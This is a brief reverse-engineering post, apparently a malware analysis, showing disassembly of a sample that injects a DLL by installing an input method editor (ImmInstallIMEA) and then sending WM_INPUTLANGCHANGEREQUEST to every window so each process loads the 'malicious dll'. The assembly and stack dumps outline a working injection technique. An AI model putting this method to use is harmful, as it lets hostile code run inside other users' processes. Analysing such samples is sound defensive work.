
# New a way to inject DLL

> 原文：[`www.pediy.com/kssd/pediy12/131990.html`](https://www.pediy.com/kssd/pediy12/131990.html)

New a way to inject DLL, utilize IMM to active DLL

```text
3147EA2    FF15 B88B1413   call dword ptr ds:[13148BB8]        ; kernel32.CreateFileA

  0012FD60   0012FE84  |FileName = "C:\\WINDOWS\\system32\\at.exe"
  0012FD64   00000000  |Access = 0
  0012FD68   00000001  |ShareMode = FILE_SHARE_READ
  0012FD6C   00000000  |pSecurity = NULL
  0012FD70   00000001  |Mode = CREATE_NEW
  0012FD74   00000080  |Attributes = NORMAL
  0012FD78   00000000  \\hTemplateFile = NULL

; Install a new IMM
1314794F    E8 6C0E0000     call B85DD0~1.131487C0      ;call IMMInstallIMEA

1314795B    8B1D 3C101413   mov ebx,dword ptr ds:[<&USER32.FindWindowEx>; USER32.FindWindowExA
13147961    6A 00           push 0
13147963    6A 00           push 0
13147965    6A 00           push 0
13147967    6A 00           push 0
13147969    FFD3            call ebx
1314796B    8BF0            mov esi,eax
1314796D    85F6            test esi,esi
1314796F    74 1B           je short B85DD0~1.1314798C
13147971    57              push edi
13147972    6A 01           push 1
13147974    6A 50           push 50
13147976    56              push esi
13147977    FF15 40101413   call dword ptr ds:[<&USER32.SendMessageA>]  ; USER32.SendMessageA

; Activate IMM, malicious dll run
1314797D    6A 00           push 0
1314797F    6A 00           push 0
13147981    56              push esi
13147982    6A 00           push 0
13147984    FFD3            call ebx
13147986    8BF0            mov esi,eax
13147988    85F6            test esi,esi
1314798A   ^ 75 E5          jnz short B85DD0~1.13147971

  0012FC44   001401B2  ?.   |hWnd = 1401B2
  0012FC48   00000050  P...  |Message = WM_INPUTLANGCHANGEREQUEST
  0012FC4C   00000001  ...   |wParam = 1
  0012FC50   E0200804
```
